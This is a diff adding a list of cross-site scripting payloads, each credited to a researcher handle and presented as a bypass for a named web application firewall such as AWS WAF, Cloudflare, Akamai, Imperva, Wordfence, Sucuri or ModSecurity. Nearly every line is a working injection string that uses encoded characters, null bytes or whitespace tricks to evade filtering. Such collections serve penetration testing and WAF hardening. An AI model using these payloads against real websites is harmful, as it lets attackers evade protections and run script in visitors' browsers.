@@ -1,0 +1,25 @@
+@vanshitmalhotra | Bypass AWS WAF -// 
+Add "<!" (without quotes) before your payload and bypass that WAF. :)
+eg: <!<script>confirm(1)</script>
+
+@black0x00mamba | Bypass WAF Akamaighost & filtered onload, onclick, href, src, onerror, script, etc 
+<img  sr%00c=x o%00nerror=((pro%00mpt(1)))>
+
+DotDefender WAF bypass by @0xInfection 
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
+
+@LooseSecurity | Updated CloudFlare bypass (bypasses virtually all WAF you'll encounter in the wild):
+<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
+Javascript URI cushioned between carriage returns with a non-bracketed prompt.
+
+@daveysec | Was able to bypass Imperva Incapsula WAF with:
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+
+@rodolfoassis | Wordfence 7.4.2
+<a href=&#01javascript:alert(1)>
+
+rodolfoassis | Sucuri CloudProxy (POST only)
+<a href=javascript&colon;confirm(1)>
+
+rodolfoassis | ModSecurity CRS 3.2.0 PL1
+<a href="jav%0Dascript&colon;alert(1)">
